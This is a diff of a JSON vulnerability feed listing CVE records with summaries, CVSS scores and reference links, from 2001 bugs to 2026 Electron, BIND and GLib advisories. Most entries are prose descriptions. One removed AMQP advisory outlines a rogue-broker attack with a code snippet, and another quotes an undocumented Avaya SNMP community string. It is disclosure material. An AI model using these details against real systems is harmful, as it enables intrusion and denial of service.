+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/142672",
+        "http://www.securityfocus.com/bid/1888",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5529",
+        "http://www.securityfocus.com/archive/1/142672",
+        "http://www.securityfocus.com/bid/1888"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0060",
+      "summary": "Format string vulnerability in stunnel 3.8 and earlier allows attackers to execute arbitrary commands via a malformed ident username.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0337.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000363",
+        "http://www.debian.org/security/2001/dsa-009",
+        "http://www.redhat.com/support/errata/RHSA-2000-129.html",
+        "http://www.securityfocus.com/archive/1/151719"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-77119",
+      "summary": "A validly signed NSEC3 from an unrelated sibling zone may be accepted as an insecurity proof, downgrading a secure delegation and letting a forged unsigned answer through.\nThis issue affects BIND 9 versions 9.11.0 through 9.18.50, 9.20.0 through 9.20.27, 9.21.0 through 9.21.25, 9.11.3-S1 through 9.18.50-S1, and 9.20.9-S1 through 9.20.27-S1.",
+      "cvssScore": 5.8,
+      "severity": "Medium",
+      "published": "2026-09-16",
+      "modified": "2026-09-16",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-77119",
+        "https://downloads.isc.org/isc/bind9/9.20.29",
+        "https://downloads.isc.org/isc/bind9/9.21.26",
+        "https://kb.isc.org/docs/cve-2026-77119"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0734",
+      "summary": "Web_Store.cgi allows remote attackers to execute arbitrary commands via shell metacharacters in the page parameter.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-07-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109008402715874&w=2",
+        "http://www.securityfocus.com/bid/10744",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16710",
+        "http://marc.info/?l=bugtraq&m=109008402715874&w=2",
+        "http://www.securityfocus.com/bid/10744"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0735",
+      "summary": "Buffer overflow in Medal of Honor (1) Allied Assault 1.11v9 and earlier, (2) Breakthrough 2.40b and earlier, and (3) Spearhead 2.15 and earlier, when playing on a Local Area Network (LAN), allows remote attackers to execute arbitrary code via vectors such as (1) the getinfo query, (2) the connect packet, and other unknown vectors.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-07-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109008314631518&w=2",
+        "http://www.securityfocus.com/bid/10743",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16715",
+        "http://marc.info/?l=bugtraq&m=109008314631518&w=2",
+        "http://www.securityfocus.com/bid/10743"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1635",
+      "summary": "Bugzilla 2.17.1 through 2.18rc2 and 2.19 from cvs, when using the insidergroup feature, does not sufficiently protect private attachments when there are changes to the metadata, such as filename, description, MIME type, or review flags, which allows remote authenticated users to obtain sensitive information when (1) viewing the bug activity log or (2) receiving bug change notification mails.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-10-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109872095201238&w=2",
+        "http://www.securityfocus.com/bid/11511",
+        "https://bugzilla.mozilla.org/show_bug.cgi?id=250605",
+        "https://bugzilla.mozilla.org/show_bug.cgi?id=253544",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17842"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1499",
+      "summary": "Directory traversal vulnerability in index.php in Bytehoard 0.7 allows remote attackers to read arbitrary files via a .. (dot dot) in the infolder parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-12-31",
       "modified": null,
       "cwe": "CWE-22",
       "references": [
-        "https://github.com/Legcord/Legcord",
-        "https://github.com/Legcord/Legcord/blob/v1.3.0/src/common/themes.ts#L269-L276",
-        "https://github.com/Legcord/Legcord/blob/v1.3.0/src/discord/ipc.ts#L201-L206",
-        "https://github.com/Legcord/Legcord/issues/1163",
-        "https://www.vulncheck.com/advisories/legcord-1.1.0-through-1.3.0-path-traversal-via-theme-ipc-handlers"
+        "http://archives.neohapsis.com/archives/bugtraq/2003-10/0200.html",
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-October/012430.html",
+        "http://www.securiteam.com/unixfocus/6L00L008KE.html",
+        "http://www.securityfocus.com/bid/8850",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13456"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77403",
-      "summary": "## Summary\nA Denial of Service (DoS) vulnerability exists in the AMQP client's connection negotiation logic. The AMQP specification explicitly mandates a strict minimum frame size of 4096 bytes to prevent pathological packet fragmentation. While the library defines a `frameMinSize = 4096` constant, the connection negotiation loop fails to enforce this boundary, blindly accepting whatever maximum frame size (`FrameMax`) the server advertises during the handshake.\n\nIf a client connects to a malicious or compromised AMQP broker that advertises an extremely low `FrameMax` (such as 1 byte), the negotiation succeeds. Consequently, every subsequent message transmission is forced to splinter into thousands or millions of single-byte frames, causing massive CPU overhead, thread contention, and a near-instantaneous application freeze.\n\n## Vulnerability Details\n\n### Mechanism\nDuring the connection establishment phase, the client and server negotiate connection parameters—including maximum channel count, heartbeat intervals, and maximum frame sizes. The vulnerability is located where the client accepts the server's tuning parameters:\n\n```go\n// Connection negotiation logic maps server values directly without validation\nif serverSettings.FrameMax > 0 {\n    // VULNERABILITY: Lacks a floor validation check against frameMinSize (4096)\n    c.config.FrameMax = serverSettings.FrameMax \n}\n```\n\nBecause there is no conditional check asserting that `serverSettings.FrameMax >= frameMinSize`, a value below the protocol specification floor is successfully registered. When the application later passes data payloads to the frame writer, the chunking algorithm splits the payload using the negotiated `FrameMax` value as its chunk window divisor.\n\n### Impact\nWhen `FrameMax` is set to an absurdly low threshold (e.g., 1 to 10 bytes):\n* A standard 10 KiB message payload requires tens of thousands of individual write operations and frame headers.\n* The system's CPU becomes entirely bound by frame serialization, memory allocation for frame structures, and context switching within the network output loops.\n* This results in an application-layer Denial of Service (DoS) affecting not just the specific AMQP connection, but potentially the entire host system due to CPU resource starvation.\n\n## Attack Vector\nAn attacker who compromises an upstream AMQP broker, performs a Man-in-the-Middle (MitM) interception, or tricks an application into connecting to an unauthorized external rogue broker can trigger this vulnerability:\n\n1. **Rogue Handshake:** The client application connects to an AMQP endpoint controlled by the attacker.\n2. **Malicious Parameter Tuning:** During the `connection.tune` phase, the rogue server returns a `FrameMax` value of `1`.\n3. **Resource Exhaustion Trigger:** The client completes the handshake successfully. As soon as the client attempts to publish a message or process traffic, the internal loop fragments the data into single-byte frames, spiking the host's CPU usage to 100% and disabling the application thread.",
-      "cvssScore": 8.9,
+      "id": "CVE-2001-0467",
+      "summary": "Directory traversal vulnerability in RobTex Viking Web server before 1.07-381 allows remote attackers to read arbitrary files via a \\... (modified dot dot) in an HTTP URL request.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-06-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.robtex.com/files/viking/beta/chglog.txt",
+        "http://www.securityfocus.com/archive/1/178935",
+        "http://www.securityfocus.com/bid/2643",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6450",
+        "http://www.robtex.com/files/viking/beta/chglog.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0468",
+      "summary": "Buffer overflow in FTPFS allows local users to gain root privileges via a long user name.",
+      "cvssScore": 7.2,
       "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
+      "published": "2001-06-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0163.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6234",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0163.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6234"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0469",
+      "summary": "rwho daemon rwhod in FreeBSD 4.2 and earlier, and possibly other operating systems, allows remote attackers to cause a denial of service via malformed packets with a short length.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-06-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/freebsd/2001-03/0163.html",
+        "http://www.securityfocus.com/bid/2473",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6229",
+        "http://archives.neohapsis.com/archives/freebsd/2001-03/0163.html",
+        "http://www.securityfocus.com/bid/2473"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-102675",
+      "summary": "### Impact\n\nResponses served through `protocol.registerFileProtocol` or `protocol.registerHttpProtocol` for a custom scheme registered with `supportFetchAPI: true` but without `corsEnabled: true` could be read cross-origin by web content. This completes the fix for CVE-2026-70604.\n\nApps are only affected if they register such a scheme, serve it through one of those handlers, and load untrusted content. Apps that set `corsEnabled: true`, or that do not load untrusted content, are not affected.\n\n### Workarounds\n\nSet `corsEnabled: true` on the scheme, or do not load untrusted content in windows that can reach it.\n\n### Fixed Versions\n\n* `44.0.0-beta.5`\n* `43.4.1`\n* `42.9.2`\n* `41.10.6`\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
+      "cvssScore": 7.4,
+      "severity": "High",
+      "published": "2026-09-29",
+      "modified": "2026-09-29",
       "cwe": {
-        "cwe_id": "CWE-770",
-        "name": "Allocation of Resources Without Limits or Throttling"
+        "cwe_id": "CWE-346",
+        "name": "Origin Validation Error"
       },
       "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-xwwf-m8fg-p9q2",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77403",
-        "https://github.com/rabbitmq/amqp091-go/pull/353",
-        "https://github.com/rabbitmq/amqp091-go/commit/2e0a919b89f337dbf58db2bb34ab206dac354a06",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
+        "https://github.com/electron/electron/security/advisories/GHSA-j84w-jfhq-vhvj",
+        "https://github.com/electron/electron/commit/4d2784cc8592471ee2276235b8c2a03efddf937d",
+        "https://github.com/electron/electron/commit/80178e4631cb2f6a5e42f8e793b2ae9624e78a0d",
+        "https://github.com/electron/electron/commit/c595b05976e7a885465b043d17e00a92fc3c3397",
+        "https://github.com/electron/electron/commit/ef75c4b98caaa3ebc615f1eba302027028ee04d2"
       ],
       "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
+        "electron npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1228",
-      "summary": "Buffer overflow in the prepare_reply function in request.c for Mathopd 1.2 through 1.5b13, and possibly earlier versions, allows remote attackers to cause a denial of service (server crash) and possibly execute arbitrary code via an HTTP request with a long path.",
-      "cvssScore": 7.5,
+      "id": "CVE-2026-102676",
+      "summary": "### Impact\n\nA `<webview>` could enable Node.js integration in its Web Workers even when its embedder had Node.js integration disabled, giving guest content more privilege than the embedder allowed.\n\nApps are only affected if they enable the `<webview>` tag and the embedder is unsandboxed. Apps that do not use `<webview>`, or that keep the embedder sandboxed, are not affected.\n\n### Workarounds\n\nRemove `nodeIntegrationInWorker` from the guest preferences in a `will-attach-webview` handler, or do not enable the `<webview>` tag when loading untrusted content.\n\n### Fixed Versions\n\n* `44.0.0-beta.5`\n* `43.4.1`\n* `42.9.2`\n* `41.10.6`\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
+      "cvssScore": 8.3,
       "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": "CWE-120",
+      "published": "2026-09-29",
+      "modified": "2026-09-29",
+      "cwe": {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
       "references": [
-        "http://marc.info/?l=bugtraq&m=107064887507504&w=2",
-        "http://marc.info/?l=bugtraq&m=107090601705839&w=2",
-        "http://secunia.com/advisories/10385/",
-        "http://www.securiteam.com/unixfocus/5FP0C1FCAW.html",
-        "http://www.securityfocus.com/bid/9871"
+        "https://github.com/electron/electron/security/advisories/GHSA-9qh4-3jw8-366w",
+        "https://github.com/electron/electron/commit/6462a2e1dc4e6adffd3b7d9b9be1474c45dcbbe2",
+        "https://github.com/electron/electron/commit/9a675aef8822bae4088567822969f900b3a37671",
+        "https://github.com/electron/electron/commit/b3ae0aab5cf81c2ed03d04df1ae8e69ecfab7886",
+        "https://github.com/electron/electron/commit/cd34f335c8664613db5b6e61ae51e2e1846233ae"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "electron npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1202",
-      "summary": "Unknown vulnerability in routed for HP Tru64 UNIX V4.0F through V5.1A allows local and remote attackers to read arbitrary files.",
+      "id": "CVE-2026-102677",
+      "summary": "### Impact\n\nThe cache Electron keeps for sandboxed preload scripts did not verify that a cached entry matched the preload it was served for. A compromised renderer could use this to run its own code in the preload context on a later load.\n\nApps are only affected if they load untrusted content. Apps that do not load untrusted content are not affected.\n\n### Workarounds\n\nThere are no app side workarounds, you must update to a patched version of Electron.\n\n### Fixed Versions\n\n* `44.0.0-beta.6`\n* `43.5.0 `\n* `42.10.0`\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2026-09-29",
+      "modified": "2026-09-29",
+      "cwe": {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      },
+      "references": [
+        "https://github.com/electron/electron/security/advisories/GHSA-qmv3-fv6v-rmhq",
+        "https://github.com/electron/electron/pull/52480",
+        "https://github.com/electron/electron/commit/000453e399bd1dee5e86376cdd9ece5fc071e601",
+        "https://github.com/electron/electron/commit/06a12a87a23f40abbf580fc7a552bc1189812c45",
+        "https://github.com/electron/electron/commit/25ba8be57c65a83d8c14ebb8aa37693df17a04f3"
+      ],
+      "vulnerableProducts": [
+        "electron npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0380",
+      "summary": "Buffer overflow in tcpdump 3.6.2 and earlier allows remote attackers to cause a denial of service and possibly execute arbitrary code via an NFS packet.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-10-28",
+      "published": "2002-06-18",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/tru64/2002-q4/0002.html",
-        "http://www.iss.net/security_center/static/10316.php",
-        "http://www.securityfocus.com/bid/5913",
-        "http://archives.neohapsis.com/archives/tru64/2002-q4/0002.html",
-        "http://www.iss.net/security_center/static/10316.php"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-025.0.txt",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000491",
+        "http://marc.info/?l=bugtraq&m=102339541014226&w=2",
+        "http://marc.info/?l=bugtraq&m=102650721503642&w=2",
+        "http://online.securityfocus.com/advisories/4169"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1203",
-      "summary": "IBM SecureWay Firewall before 4.2.2 performs extra processing before determining that a packet is invalid and dropping it, which allows remote attackers to cause a denial of service (resource exhaustion) via a flood of malformed TCP packets without any flags set.",
+      "id": "CVE-2001-0104",
+      "summary": "MDaemon Pro 3.5.1 and earlier allows local users to bypass the \"lock server\" security setting by pressing the Cancel button at the password prompt, then pressing the enter key.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/151156",
+        "http://www.securityfocus.com/bid/2115",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5763",
+        "http://www.securityfocus.com/archive/1/151156",
+        "http://www.securityfocus.com/bid/2115"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0105",
+      "summary": "Vulnerability in top in HP-UX 11.04 and earlier allows local users to overwrite files owned by the \"sys\" group.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0079.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5773",
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0079.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5773"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0106",
+      "summary": "Vulnerability in inetd server in HP-UX 11.04 and earlier allows attackers to cause a denial of service when the \"swait\" state is used by a server.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-10-28",
-      "modified": null,
-      "cwe": "CWE-399",
-      "references": [
-        "http://marc.info/?l=bugtraq&m=103417988503398&w=2",
-        "http://www.iss.net/security_center/static/10249.php",
-        "http://www.securityfocus.com/bid/5924",
-        "http://marc.info/?l=bugtraq&m=103417988503398&w=2",
-        "http://www.iss.net/security_center/static/10249.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58015",
-      "summary": "A flaw was found in GLib. The D-Bus client-side implementation of the DBUS_COOKIE_SHA1 SASL authentication mechanism does not validate the cookie_context parameter received from the server. A malicious D-Bus server can supply a cookie_context containing path traversal sequences, causing the client to read an arbitrary file and exfiltrate sensitive data by verifying guessed file contents against a generated hash.",
-      "cvssScore": 5.8,
-      "severity": "Medium",
-      "published": "2026-06-30",
-      "modified": "2026-10-02",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-58015",
-        "https://access.redhat.com/errata/RHSA-2026:49512",
-        "https://access.redhat.com/errata/RHSA-2026:73909",
-        "https://access.redhat.com/errata/RHSA-2026:73929",
-        "https://access.redhat.com/errata/RHSA-2026:73930"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58014",
-      "summary": "A flaw was found in GLib. An off-by-one error can occur in the g_key_file_get_locale_string_list function in the gkeyfile.c file when loading a key file with an empty value. This flaw can cause an out-of-bounds access of 1 byte or a denial of service when the out-of-bounds access crosses a page boundary.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2026-06-30",
-      "modified": "2026-10-02",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-58014",
-        "https://access.redhat.com/errata/RHSA-2026:73859",
-        "https://access.redhat.com/errata/RHSA-2026:73909",
-        "https://access.redhat.com/errata/RHSA-2026:73929",
-        "https://access.redhat.com/errata/RHSA-2026:73930"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-16118",
-      "summary": "A flaw was found in xdgmime. A heap-based buffer overflow can be triggered in _xdg_mime_magic_parse_magic_line() in the xdgmimemagic.c file on little-endian systems when an attacker-controlled MIME magic file in a user-writable XDG data location (e.g., in the $XDG_DATA_HOME/mime/magic path) is parsed by an application performing MIME type detection (e.g., via g_content_type_guess()). When performing byte-swap, incorrect pointer arithmetic on the write side causes an out-of-bounds write of 2 bytes, resulting in an application crash or memory corruption.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-07-17",
-      "modified": "2026-10-02",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-16118",
-        "https://access.redhat.com/errata/RHSA-2026:64799",
-        "https://access.redhat.com/errata/RHSA-2026:74362",
-        "https://access.redhat.com/errata/RHSA-2026:74363",
-        "https://access.redhat.com/errata/RHSA-2026:74364"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58016",
-      "summary": "A flaw was found in GLib. A state confusion issue exists in g_dbus_node_info_new_for_xml() in the gio/gdbusintrospection.c file when processing malformed D-Bus introspection XML, specifically with a <node> element nested within other elements like <method>, <signal>, <property> or <arg>. This issue can cause an unsigned integer overflow and lead to an out-of-bounds read, resulting in a denial of service.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-06-30",
-      "modified": "2026-10-02",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-58016",
-        "https://access.redhat.com/errata/RHSA-2026:42063",
-        "https://access.redhat.com/errata/RHSA-2026:72475",
-        "https://access.redhat.com/errata/RHSA-2026:72476",
-        "https://access.redhat.com/errata/RHSA-2026:72502"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1448",
-      "summary": "An undocumented SNMP read/write community string ('NoGaH$@!') in Avaya P330, P130, and M770-ATM Cajun products allows remote attackers to gain administrative privileges.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-07-08",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0519.html",
-        "http://support.avaya.com/security/Unauthorized_SNMP/index.jhtml",
-        "http://www.iss.net/security_center/static/9769.php",
-        "http://www.securityfocus.com/bid/5396",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0519.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0637",
-      "summary": "InterScan VirusWall 3.52 build 1462 allows remote attackers to bypass virus protection via e-mail messages with headers that violate RFC specifications by having (or missing) space characters in unexpected places (aka \"space gap\"), such as (1) Content-Type :\", (2) \"Content-Transfer-Encoding :\", (3) no space before a boundary declaration, or (4) \"boundary= \", which is processed by Outlook Express.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-07-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/9464.php",
-        "http://www.securiteam.com/securitynews/5KP000A7QE.html",
-        "http://www.iss.net/security_center/static/9464.php",
-        "http://www.securiteam.com/securitynews/5KP000A7QE.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1729",
-      "summary": "Cross-site scripting (XSS) vulnerability in Nihuo Web Log Analyzer 1.6 allows remote attackers to inject arbitrary web script or HTML via the User-Agent HTTP header.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-08-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109305923208449&w=2",
-        "http://secunia.com/advisories/12347",
-        "http://www.securityfocus.com/bid/10988",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17055",
-        "http://marc.info/?l=bugtraq&m=109305923208449&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1731",
-      "summary": "signup_page.php in Mantis bugtracker allows remote attackers to send e-mail bombs by creating multiple users and providing the same e-mail address.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-08-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109312225727345&w=2",
-        "http://www.securityfocus.com/bid/10995",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17093",
-        "http://marc.info/?l=bugtraq&m=109312225727345&w=2",
-        "http://www.securityfocus.com/bid/10995"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1377",
-      "summary": "Multiple RADIUS implementations do not properly validate the Vendor-Length of the Vendor-Specific attribute, which allows remote attackers to cause a denial of service (crash) via a Vendor-Length that is less than 2.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-03-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SN-02:02.asc",
-        "http://archives.neohapsis.com/archives/linux/suse/2002-q2/0362.html",
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000466",
-        "http://marc.info/?l=bugtraq&m=101537153021792&w=2",
-        "http://www.cert.org/advisories/CA-2002-06.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0018",
-      "summary": "In Microsoft Windows NT and Windows 2000, a trusting domain that receives authorization information from a trusted domain does not verify that the trusted domain is authoritative for all listed SIDs, which allows remote attackers to gain Domain Administrator privileges on the trusting domain by injecting SIDs from untrusted domains into the authorization data that comes from from the trusted domain.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2002-03-08",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/3997",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-001",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8023",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A159",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A64"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0380",
-      "summary": "Buffer overflow in atftp daemon (atftpd) 0.6.1 and earlier, and possibly later versions, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long filename.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-07-02",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2003-06/0056.html",
-        "http://www.debian.org/security/2003/dsa-314",
-        "http://www.securityfocus.com/archive/82/323886/2003-06-02/2003-06-08/0",
-        "http://archives.neohapsis.com/archives/bugtraq/2003-06/0056.html",
-        "http://www.debian.org/security/2003/dsa-314"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0964",
-      "summary": "Buffer overflow in client for Half-Life 1.1.0.8 and earlier allows malicious remote servers to execute arbitrary code via a long console command.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-09-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-09/0178.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7148",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-09/0178.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7148"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0203",
-      "summary": "Buffer overflow in moxftp 2.2 and earlier allows remote malicious FTP servers to execute arbitrary code via a long FTP banner.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-04-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=104610380126860&w=2",
-        "http://secunia.com/advisories/8136",
-        "http://www.debian.org/security/2003/dsa-281",
-        "http://www.derkeiler.com/Mailing-Lists/Full-Disclosure/2003-02/0338.html",
-        "http://www.securityfocus.com/bid/6921"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0377",
-      "summary": "Buffer overflow in the win32_stat function for (1) ActiveState's ActivePerl and (2) Larry Wall's Perl before 5.8.3 allows local or remote attackers to execute arbitrary commands via filenames that end in a backslash character.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-05-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-April/019794.html",
-        "http://marc.info/?l=bugtraq&m=108118694327979&w=2",
-        "http://public.activestate.com/cgi-bin/perlbrowse?patch=22552",
-        "http://www.idefense.com/application/poi/display?id=93&type=vulnerabilities",
-        "http://www.kb.cert.org/vuls/id/722414"
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0009.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5904",
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0009.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5904"
       ],
       "vulnerableProducts": [],
       "isExploited": false
